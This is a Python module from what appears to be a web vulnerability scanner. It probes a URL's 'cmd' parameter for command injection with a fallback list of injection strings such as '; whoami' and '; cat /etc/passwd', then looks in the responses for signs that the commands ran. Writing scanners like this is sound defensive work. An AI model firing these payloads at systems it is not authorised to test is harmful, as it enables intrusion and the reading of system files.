
import os
import utils
from core.network import requester
from config import Colors

def scan_command_injection(url):
    Colors.info("Testing for Command Injection...")
    
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    payload_dir = os.path.join(base_dir, "Payloads", "Command_Injection")
    
    cmd_payloads = []
    if os.path.exists(payload_dir):
        cmd_payloads = utils.load_payloads_from_dir(payload_dir)
    
    if not cmd_payloads:
         cmd_payloads = [
            "; ls", "&& ls", "| ls", "|| ls",
            "; whoami", "&& whoami", "| whoami",
            "; cat /etc/passwd", "&& cat /etc/passwd"
        ]

    vulnerabilities = []

    from concurrent.futures import ThreadPoolExecutor, as_completed
    from config import MAX_THREADS

    vulnerabilities = []

    def test_payload(payload):
        test_url = f"{url}?cmd={payload}"
        try:
            response = requester.get(test_url)
            # Stricter checks for RCE
            output = response.text.lower()
            if (
                "root:x:0:0" in output or 
                "uid=" in output or 
                "gid=" in output or 
                "windows ip configuration" in output or 
                "directory of" in output or
                "www-data" in output
            ):
                Colors.vuln("Command Injection Vulnerability Found!")
                return {
                    "type": "Command Injection",
                    "payload": payload,
                    "location": f"Parameter: cmd (in URL: {test_url})",
                    "impact": "Attacker can execute arbitrary system commands, potentially taking over the server.",
                    "severity": "Critical",
                    "recommendation": "Sanitize user input and avoid using unsanitized system commands."
                }
        except:
            pass
        return None

    # Threaded Scan
    Colors.info(f"Scanning with {MAX_THREADS} threads...")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(test_payload, p): p for p in cmd_payloads}
        for future in as_completed(futures):
            res = future.result()
            if res:
                vulnerabilities.append(res)
                # Exhaustive: continue

    return vulnerabilities
